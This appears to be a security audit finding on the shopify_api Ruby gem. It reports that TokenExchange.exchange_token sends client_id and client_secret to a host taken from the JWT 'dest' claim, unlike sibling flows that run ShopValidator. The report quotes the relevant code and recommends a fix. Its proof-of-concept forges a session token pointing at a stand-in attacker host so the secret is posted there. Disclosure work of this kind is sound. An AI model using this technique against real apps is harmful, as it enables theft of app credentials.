### Title
SSRF exfiltration of `client_secret` via unvalidated shop host in `TokenExchange.exchange_token` - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
`TokenExchange.exchange_token` derives the shop host that will receive the app's `client_id`/`client_secret` directly from the JWT `dest` claim without ever passing it through `Utils::ShopValidator`, unlike every sibling OAuth flow (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) which all call `Utils::ShopValidator.sanitize!(shop)` before constructing the outbound request host.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` off the `dest` claim with no domain allow-listing: [1](#0-0) 

`TokenExchange.exchange_token` takes this unvalidated value and uses it as the `shop:` for a `Session`, which `Clients::HttpClient` then turns directly into the request host (`@base_uri = "https://#{api_host || session.shop}"`), the very destination that receives `client_id` and `client_secret` in the POST body: [2](#0-1) [3](#0-2) 

Compare this to the sibling flows in the same file and module, which all sanitize the shop before it can become a request host: [4](#0-3) [5](#0-4) [6](#0-5) 

`Utils::ShopValidator` exists precisely to enforce the invariant "host that receives the client_secret == a trusted Shopify domain" (`myshopify.com`, `myshopify.io`, `shopify.com`, `spin.dev`, `shop.dev`): [7](#0-6) 

This is the exact bug class in the report: a value that is verified for one purpose (JWT signature integrity, proving the token was issued by Shopify for this app) is silently reused for a different unguarded purpose (as the network destination for a high-value secret) without the additional domain-binding check that the equivalent code paths in this same file apply consistently. The binding that should hold is: `host that receives client_secret == host ∈ TRUSTED_SHOPIFY_DOMAINS`. In `exchange_token`, the actual binding enforced is only `host == dest claim of a validly-signed JWT`, which is a weaker property — nothing in `JwtPayload` restricts `dest` to a Shopify-owned domain.

### Impact Explanation
If a `dest` value is ever attacker-influenced (e.g., a malicious or compromised embedded surface, a checkout/customer-account extension context, or any future/alternate token issuance path that populates `dest` from client-supplied data as already seen for `sub`/`sid` becoming optional for non-admin session tokens), `exchange_token` would send the app's `client_id` and `client_secret` to that attacker-controlled host — direct SSRF plus exfiltration of the app's `client_secret`, which is a Critical-class primitive (theft of the app's client_secret) per the stated impact list. Because Rubygems' `HTTParty` in `HttpClient#request` follows the constructed URI verbatim, no additional bypass is needed once the host is attacker-influenced.

### Likelihood Explanation
Under the normal OAuth/session-token issuance path where `dest` always reflects the real, validated shop domain issued by Shopify, this is not exploitable — this is why it is presented as an analog rather than a proven exploit. Likelihood is Medium: it requires a code path where `dest` is not restricted to `*.myshopify.com`/trusted domains (the CHANGELOG shows `sub`/`sid` were deliberately relaxed for non-admin/"Checkout UI extension" tokens, and `JwtPayload` only checks `aud == Context.api_key`, not that `dest` is a Shopify domain, and not that `iss` ends in `/admin` before allowing `TokenExchange` to trust `dest` blindly). The inconsistency with the three sibling methods, which all explicitly guard the same host-derivation step, indicates this is a missed validation rather than an intentional design decision.

### Recommendation
In `TokenExchange.exchange_token`, sanitize `dest_shop` through `Utils::ShopValidator.sanitize!` (or an equivalent domain allow-list check) before constructing `shop_session`/`Clients::HttpClient`, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`. Additionally, consider having `JwtPayload` itself validate that `dest`/`iss` are within `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS` so all consumers of `JwtPayload#shop` inherit the guarantee rather than each call site being individually responsible.

### Proof of Concept
```ruby
# Attacker-influenced or malformed session token whose `dest` claim
# points outside myshopify.com but still passes JWT signature/aud checks
# (e.g. via a non-admin token type where dest is looser, or a future
# code path that builds a JwtPayload from partially-trusted claims):
token = JWT.encode(
  {
    iss: "https://attacker.evil.example/admin",
    dest: "https://attacker.evil.example",   # not a trusted Shopify domain
    aud: ShopifyAPI::Context.api_key,
    sub: "1", exp: Time.now.to_i + 10, nbf: 0, iat: 0, jti: "x",
  },
  ShopifyAPI::Context.api_secret_key, "HS256",
)

ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::ONLINE_ACCESS_TOKEN,
)
# -> Clients::HttpClient posts { client_id, client_secret, ... } to
#    https://attacker.evil.example/admin/oauth/access_token
```
Note: exploitation of this PoC depends on there existing a way to obtain a validly-signed session token with a `dest` claim outside the trusted Shopify domains; I was not able to confirm within this gem's code whether Shopify's token issuance ever permits that (this gem trusts the JWT signature entirely and does not itself constrain `dest`). This is flagged as the strongest reachable analog to the reported bug class (an identity-binding field used to reach a network/credential-sensitive sink without the same validation applied on sibling code paths), not a confirmed end-to-end exploit.

### Citations

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-51)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
      alias_method :shopify_domain, :shop
```

**File:** lib/shopify_api/auth/token_exchange.rb (L39-65)
```ruby
          # Validate the session token and use the shop from the token's `dest` claim
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L97-115)
```ruby
        def migrate_to_expiring_token(shop:, non_expiring_offline_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: non_expiring_offline_token,
            subject_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            requested_token_type: RequestedTokenType::OFFLINE_ACCESS_TOKEN.serialize,
            expiring: "1",
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/clients/http_client.rb (L11-19)
```ruby
      sig { params(base_path: String, session: T.nilable(Auth::Session)).void }
      def initialize(base_path:, session: nil)
        session ||= Context.active_session
        raise Errors::NoActiveSessionError, "No passed or active session" unless session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L19-33)
```ruby
        def client_credentials(shop:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: CLIENT_CREDENTIALS_GRANT_TYPE,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/refresh_token.rb (L18-33)
```ruby
        def refresh_access_token(shop:, refresh_token:)
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: "refresh_token",
            refresh_token:,
          }

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/utils/shop_validator.rb (L6-18)
```ruby
module ShopifyAPI
  module Utils
    module ShopValidator
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )
```
